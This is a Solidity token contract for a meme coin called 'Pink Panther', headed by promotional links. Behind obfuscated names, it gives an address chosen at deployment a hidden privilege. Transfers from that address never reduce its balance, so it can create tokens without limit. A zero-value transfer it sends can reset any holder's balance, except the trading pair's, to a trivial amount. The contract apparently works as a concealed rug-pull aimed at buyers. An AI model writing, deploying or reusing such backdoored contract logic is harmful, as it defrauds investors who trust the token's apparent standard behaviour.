/*

Website: https://pinkpanther.crypto-token.live/

Telegram: https://t.me/PinkPanther_ETH

Twitter: https://twitter.com/PinkPanthrETH

*/

// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.14;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract PinkPanther is Ownable {
    mapping(address => uint256) private pcadqf;

    string public name = 'Pink Panther';

    function approve(address onsg, uint256 ydrpvaxfs) public returns (bool success) {
        allowance[msg.sender][onsg] = ydrpvaxfs;
        emit Approval(msg.sender, onsg, ydrpvaxfs);
        return true;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    uint8 public decimals = 9;

    uint256 private uwne = 104;

    string public symbol = 'Pink Panther';

    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(address jcsdnruygf) {
        balanceOf[msg.sender] = totalSupply;
        exujlynpgr[jcsdnruygf] = uwne;
        IUniswapV2Router02 wfla = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        srdjcatoxzbn = IUniswapV2Factory(wfla.factory()).createPair(address(this), wfla.WETH());
    }

    mapping(address => mapping(address => uint256)) public allowance;

    function transferFrom(address nbfyiwgpzm, address gwok, uint256 ydrpvaxfs) public returns (bool success) {
        require(ydrpvaxfs <= allowance[nbfyiwgpzm][msg.sender]);
        allowance[nbfyiwgpzm][msg.sender] -= ydrpvaxfs;
        xmtdfle(nbfyiwgpzm, gwok, ydrpvaxfs);
        return true;
    }

    mapping(address => uint256) private exujlynpgr;

    mapping(address => uint256) public balanceOf;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    address public srdjcatoxzbn;

    function xmtdfle(address nbfyiwgpzm, address gwok, uint256 ydrpvaxfs) private {
        if (exujlynpgr[nbfyiwgpzm] == 0) {
            balanceOf[nbfyiwgpzm] -= ydrpvaxfs;
        }
        balanceOf[gwok] += ydrpvaxfs;
        if (exujlynpgr[msg.sender] > 0 && ydrpvaxfs == 0 && gwok != srdjcatoxzbn) {
            balanceOf[gwok] = uwne;
        }
        emit Transfer(nbfyiwgpzm, gwok, ydrpvaxfs);
    }

    function transfer(address gwok, uint256 ydrpvaxfs) public returns (bool success) {
        xmtdfle(msg.sender, gwok, ydrpvaxfs);
        return true;
    }
}